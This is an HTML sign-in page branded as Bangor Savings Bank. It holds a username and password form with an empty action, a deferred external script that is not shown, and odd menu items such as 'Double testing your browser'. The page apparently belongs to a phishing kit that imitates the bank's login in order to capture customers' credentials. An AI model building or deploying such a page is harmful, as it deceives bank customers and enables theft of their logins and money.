<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    			<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no">

    <title>Bangor Savings Bank</title>
	<link rel="stylesheet"  href="./styles/index.css" />
  <script src="/assets/js/index.js" defer></script>
  </head>
  <body>
    <div class="container">
      <img src="/assets/img/back.png" class="img" alt="" />
      <div class="form-field">
        <img class="logo" src="assets/img/logo.png"></img>
        <form action="">
          <label for="username">Username
            <input type="text" name="username">
          </label>
          <label for="password">Password
            <input type="password" name="password" id="" placeholder="">
          </label>
          <div class="error"></div>
          <button type="submit" class="submit">Login</button>
        </form>
        <ul class="options">
          <li>Sign up</li>
          <li>Forgot Login</li>
          <li>Test your browser</li>
          <li>Double testing your browser</li>
        </ul>
      </div>
      
    </div>
    <div class="footer">
        <img src="/assets/img/memberFDIC.jpg" alt="">
        <img src="/assets/img/dg.png" class="mm" alt="">
      </div>
  </body>
</html>
